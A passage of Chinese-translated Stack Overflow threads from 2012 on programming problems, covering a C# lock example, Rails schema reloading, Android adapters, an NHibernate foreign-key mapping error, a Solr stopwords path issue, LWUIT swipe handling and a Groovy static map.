很抱歉给您带来不便，我假设您使用的是 .NET，因为您已将 Windows Azure 标记添加到此线程。我对 Windows Azure 很熟悉，但我对 Qt 的了解有限。但是，它与在其他并发场景中使用信号/插槽没有什么不同。本文档可能会有所帮助：http: [//qt-project.org/doc/qt-4.8/signalsandslots.html](http://qt-project.org/doc/qt-4.8/signalsandslots.html)。

此致，

明旭。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-19T07:36:41.770

我不熟悉 QNetworkAccessManager。但一般来说，要处理竞争条件，请使用锁。通常，在 C# 中使用锁的方法是利用 lock 关键字。就像是：

```
private object lockingObject = new object();

In a method:

lock
{
                // If a thread acquires a lock, another thread is blocked here until the lock is released.
} 
```

此外，您可以参考[http://msdn.microsoft.com/en-us/library/c5kehkcz(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/c5kehkcz(v=vs.100).aspx)了解更多信息。

此致，

明旭。

# ruby-on-rails - 如何在 Rails 应用程序中重新加载 schema.rb？

> ID：10220969
> 
> 赞同：5
> 
> 时间：2012-04-19T02:44:53.217
> 
> 标签：ruby-on-rails, ruby

我目前有一些迁移是在我最初使用 rails generate model 创建模型时创建的。我已经运行了这些迁移并成功更新了数据库。

然后，我对这些迁移进行了一些更改（未添加新迁移），因为它们是非常小的更改，例如新列、使列唯一或添加索引。

但是，即使我重置我的数据库并再次运行所有迁移，rails 仍坚持使用过时的 schema.rb 文件。

我应该做什么？如何强制重新加载此 schema.rb？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-19T03:05:09.730

如果您尚未将代码推送到生产环境，您可以运行`rake db:rollback`然后`rake db:migrate`删除并重新创建表。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2015-03-27T22:32:08.610

用这个：

**rake db:drop db:create db:migrate**

# android - 如何从外部更改适配器的元素？

> ID：10220972
> 
> 赞同：1
> 
> 时间：2012-04-19T02:45:01.490
> 
> 标签：android, gallery

我有一个*画廊*`custom adapter`。我正在显示图像以及一些文本和按钮。

我想在*单击相应按钮时*更改与图像关联的文本。

如果我将按钮处理程序放在适配器内，它不会捕捉到调用。

我发现我应该将处理程序移到活动中。

但问题是我无法再访问适配器了。有什么解决办法吗？

```
public class MyAdapter extends BaseAdapter { ...

MyGallery myGallery = (MyGallery) findViewById(R.id.mygallery);
myGallery.setAdapter(new MyAdapter(this, ...)); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T03:37:53.507

您应该在适配器的 getView 函数中设置 OnClickListener。当您膨胀视图时，您可以在视图上调用 findViewById 以获取对 Button 的引用。然后，您可以在 Button 对象本身上设置 OnClickListener。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T03:39:38.407

移动

```
MyGallery myGallery = (MyGallery) findViewById(R.id.mygallery);
myGallery.setAdapter(new MyAdapter(this, ...)); 
```

进入你的`Activity`

哦，是的，并让成员引用`Adapter`例如`MyAdapter myAdapter = new MyAdapter(....`

# c# - NHibernate 配置，外键

> ID：10220973
> 
> 赞同：1
> 
> 时间：2012-04-19T02:45:08.277
> 
> 标签：c#, hibernate, nhibernate, postgresql, nhibernate-mapping

我必须承认我对 NHibernate 还是很陌生，所以请放轻松。

我有 2 个 POCO，一个`Log`和一个`UserProfile`. 如果本质上不明确，则日志条目可以引用用户配置文件，并且用户配置文件可以有许多与之关联的日志条目。映射文件如下所示：

```
<?xml version="1.0" encoding="utf-8" ?>
<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2"
                   assembly="C3.DataModel.Generated"
                   namespace="C3.DataModel">
    <class name="Log" table="Logs">
        <id name="LogId">
            <generator class="guid" />
        </id>
        <property name="TimeStamp" column="TimeStamp" index="ixLogTimeStamp" not-null="false" />
        <property name="Thread" length="255" column="Thread" not-null="false" />
        <property name="Severity" column="Severity" />
        <property name="Source" length="255" not-null="false" column="Source" />
        <property name="Message" length="4000" not-null="false" column="Message" />
        <property name="Exception" length="4000" column="Exception" not-null="true" />
        <many-to-one name="UserProfile" not-null="false" class="UserProfile" foreign-key="UserID" column="UserID" />
    </class>
</hibernate-mapping>

<?xml version="1.0" encoding="utf-8" ?>
<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2"
                   assembly="C3.DataModel.Generated"
                   namespace="C3.DataModel">
    <class name="UserProfile" table="UserProfiles">
        <id name="UserID">
            <generator class="assigned" />
        </id>
        <property name="GivenName" length="40" column="GivenName" />
        <property name="MiddleName" length="40" column="MiddleName" not-null="false" />
        <property name="FamilyName" length="40" column="FamilyName" />
        <property name="UserName" length="250" index="ixUserName" unique="true" />
        <property name="NickName" length="40" column="NickName" />
        <property name="Address1" length="50" column="Address1" />
        <property name="Address2" length="50" column="Address2" />
        <property name="City" length="50" column="City" />
        <property name="State" length="2" column="State" />
        <property name="ZipCode" length="10" column="ZipCode" />
        <property name="Bio" length="2000" column="Bio" not-null="false" />
        <property name="BirthDate" not-null="false" column="BirthDate" />
        <property name="LinkToAvatar" length="250" column="LinkToAvatar" not-null="false" />
        <property name="LinkToWebpage" length="250" column="LinkToWebPage" not-null="false" />
        <bag name="ActivityLogs" cascade="none" table="Logs" >
            <key column="LogId" />
            <one-to-many class="Log"/>
        </bag>
    </class>
</hibernate-mapping> 
```

当我尝试针对 PostgreSQL 数据库构建架构时，我收到以下错误：

```
NHibernate.HibernateException: ERROR: 42804: foreign key constraint "fkf9c1212b275a3569" cannot be implemented ---> Npgsql.NpgsqlException: ERROR: 42804: foreign key constraint "fkf9c1212b275a3569" cannot be implemented
   at Npgsql.NpgsqlState.<ProcessBackendResponses_Ver_3>d__a.MoveNext()
   at Npgsql.ForwardsOnlyDataReader.GetNextResponseObject()
   at Npgsql.ForwardsOnlyDataReader.GetNextRowDescription()
   at Npgsql.ForwardsOnlyDataReader.NextResult()
   at Npgsql.ForwardsOnlyDataReader..ctor(IEnumerable`1 dataEnumeration, CommandBehavior behavior, NpgsqlCommand command, NotificationThreadBlock threadBlock, Boolean synchOnReadError)
   at Npgsql.NpgsqlCommand.GetReader(CommandBehavior cb)
   at Npgsql.NpgsqlCommand.ExecuteNonQuery()
   at NHibernate.Tool.hbm2ddl.SchemaExport.ExecuteSql(IDbCommand cmd, String sql)
   at NHibernate.Tool.hbm2ddl.SchemaExport.Execute(Action`1 scriptAction, Boolean export, Boolean throwOnError, TextWriter exportOutput, IDbCommand statement, String sql)
   at NHibernate.Tool.hbm2ddl.SchemaExport.Execute(Action`1 scriptAction, Boolean export, Boolean justDrop, IDbConnection connection, TextWriter exportOutput)
   at NHibernate.Tool.hbm2ddl.SchemaExport.Execute(Action`1 scriptAction, Boolean export, Boolean justDrop)
   --- End of inner exception stack trace ---
   at NHibernate.Tool.hbm2ddl.SchemaExport.Execute(Action`1 scriptAction, Boolean export, Boolean justDrop)
   at NHibernate.Tool.hbm2ddl.SchemaExport.Execute(Boolean script, Boolean export, Boolean justDrop)
   at NHibernate.Tool.hbm2ddl.SchemaExport.Create(Boolean script, Boolean export)
   at C3.DataModel.Repositories.NHibernateHelper.CreateSchema() in C:\projects\C3\C3.DataModel.Generated\Repositories\NHibernateHelper.cs:line 41 
```

它在死亡时尝试运行的 SQL 是：

```
alter table Logs add constraint FKF9C1212B275A3569 foreign key (LogId) references UserProfiles 
```

...这显然不是我所期望的，但我不知道在哪里修复它。先告诉我我做错了什么，然后得到一些快速的代表。如果您能解释一下，以便我能理解我哪里出错了，我将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-20T01:24:47.893

如果您不想要外键，请从映射中删除以下行：

```
<key column="LogId" /> 
```

在您的问题中，您没有指定您期望它做什么。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-20T01:57:03.177

答案很简单；我希望错误反映了真正的错误。

我试图通过在两者的映射中定义双向关系来建立双向关系；这是不必要和不正确的。我删除了

```
 <bag name="ActivityLogs" cascade="none" table="Logs" >
        <key column="LogId" />
        <one-to-many class="Log"/>
   </bag> 
```

我的 UserProfile 配置中的元素，错误消失了。

# django - Django Haystack Solr：访问 /solr/admin/ 的 HTTP 错误 500

> ID：10220982
> 
> 赞同：0
> 
> 时间：2012-04-19T02:45:35.823
> 
> 标签：django, solr, django-haystack

访问 /solr/admin/ 的 HTTP 错误 500。原因：solr 配置中的严重错误。

检查您的日志文件以获取有关可能出现问题的更多详细信息。

如果您希望 solr 在配置错误后继续，请更改：

错误的

在 solr.xml 中

* * *

java.lang.RuntimeException：在类路径或 org.apache.solr.core.SolrResourceLoader.openResource 的 'solr/./conf/'、cwd=/home/bill/solr/boatsite 中找不到资源 'stopwords_en.txt' (SolrResourceLoader.java:273)

==================================================== =======

我在用：

django 1.3.1、django-haystack 2.0.0beta、JDK1/6/0_31、apache-solr-3.6.0

目录结构文件位置：

```
/home/bill/workspace/boatsite/myapp

/home/bill/solr/boatsite/solr/solr.xml

/home/bill/solr/boatsite/solr/conf/schema.xml

/home/bill/solr/boatsite/solr/conf/solrconfig.xml

/home/bill/solr/boatsite/solr/conf/data/index/*.* 
```

注意：/solr/ 下的所有内容都与 solr 教程中的 /example/solr/ 下相同

```
HAYSTACK_CONNECTIONS = {
    'default': {
        'ENGINE': 'haystack.backends.solr_backend.SolrEngine',
        'URL': 'http://127.0.0.1:8983/solr'
    },
} 
```

据我所知，/home/bill/solr/boatsite 下面的所有内容都与 /home/bill/solr/example 相同，除了 schema.xml java -jar start.jar 适用于“example”但不适用于“boatsite” .我错过了什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T15:23:21.283

问题已解决。

Solr 3.6.0 更改了查找 stopwords_en.txt 的位置（现在在子目录 /lang 中）。Haystack 2.0.0 beta 生成的 Schema.xml 需要编辑。现在一切正常。

我认为 beerbajay 有答案，但我一开始不明白。

# lwuit - 如何在 LWUIT 中实现拖动？

> ID：10220996
> 
> 赞同：0
> 
> 时间：2012-04-19T02:48:36.473
> 
> 标签：lwuit, lwuit-form, lwuit-container

我的 LWUIT 应用程序有 3 种形式：

1) A 型 2) B 型 3) C 型

屏幕上显示的当前表单是 FormB。

情况1：

如果用户在他的触摸屏手机上向左滑动手指，我希望 LWUIT 捕获该事件并显示 FormC

案例2：

如果用户在他的触摸屏手机上向右滑动手指，我希望 LWUIT 捕获该事件并显示 FormA

我该怎么做呢？我认为它必须与拖动事件有关，但不知道如何实现它。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T07:11:19.537

```
just need to override pointerDragged method in form and get/cal its X,Y positions and display another form. 

new Form()
{

protected void pointerDragged(int x, int y) {
if(x,y....)
{
form3.show();

}else
{
from1.show();
}
super.pointerDragged(x,y);

}

};

here x,y can be calculated based on screen resolutions and components u have added to it. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T18:03:03.520

使用带有 3 个容器的 Tabs 组件，它支持 Swipe。您可以将选项卡本身设置为隐藏。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-19T06:37:43.187

而不是采用 3 个表单，而是在 1 个表单和 setScrollableX(true) 下使用 3 个容器，并将所有组件添加到适当的容器中。

# grails - Grails Groovy - 无法从另一个类访问静态地图（集合）

> ID：10220999
> 
> 赞同：1
> 
> 时间：2012-04-19T02:48:57.900
> 
> 标签：grails, groovy

我有一个类来存储我所有的常量值，在我决定存储地图之前一切都很好。

```
final class Constants {
    public static final Map states = [a: 1,b: 2]
} 
```

在服务内部：

```
assert Constants.states.a == 1 
```

结果错误：

```
assert Constants.states.a == 1 | | a false 
```

它返回的是键而不是值。并且仅当 Map 在另一个类中时才会发生，因为如果我在进行断言的同一类中声明它，一切都会按预期工作。

我真的很困惑，这不应该发生，是吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T11:44:40.207

当您添加最终访问说明符时，此类是公共的吗？先检查一下。如果是，则尝试 assert Constants.states.get('a') == 1